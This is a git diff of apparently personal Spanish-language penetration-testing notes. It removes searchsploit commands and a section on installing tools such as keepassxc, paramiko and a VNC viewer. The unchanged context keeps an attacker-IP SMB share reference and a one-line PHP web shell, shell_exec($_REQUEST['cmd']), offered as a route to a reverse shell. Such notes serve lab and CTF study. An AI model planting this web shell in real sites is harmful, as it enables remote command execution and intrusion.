@@ -74,9 +74,6 @@ Modo Vi en la consola
 		- 10.10.14.17 -> Nuestra direccion IP
 		- smbFolder -> Nombre de la carpeta del recurso compartido 
 
-- Comando -> **searchsploit < FILENAME>** Buscamos vulnerabilidades, si encontramos con .py mucho mejor
-- Comando -> **searchsploit -m < RUTA DEL ARCHIVO>** Nos traemos el archivo a nuestra maquina
-- Comando -> **searchsploit -x < RUTA DEL ARCHIVO>** Miramos el contenido del archivo 
 
 - Comando -> **chown <USER:USER> -R < DIR PATH>** Le cambiamos el propietario a un directorio (R=Forma recursiva)
 - Comando -> **chmod u+x < FILE>** Le cambiamos los permisos a un archivo (r=read, w=write, x=execution, u=user, g=grupo, o=other)
@@ -125,10 +122,3 @@ De esta manera tambien podemos hacer una revershell mas bonita, la peticion se e
 <?
 		echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?> 
----
-
-### Instalacion de herramientas 
-
-- **apt install keepassxc** Para instalar el keepass
-- **pip2 install paramiko** Para instalar paramiko en python2
-- **apt install xtightvncviewer** Instalamos el vncviewer para podernos conectar remotamente a una maquina
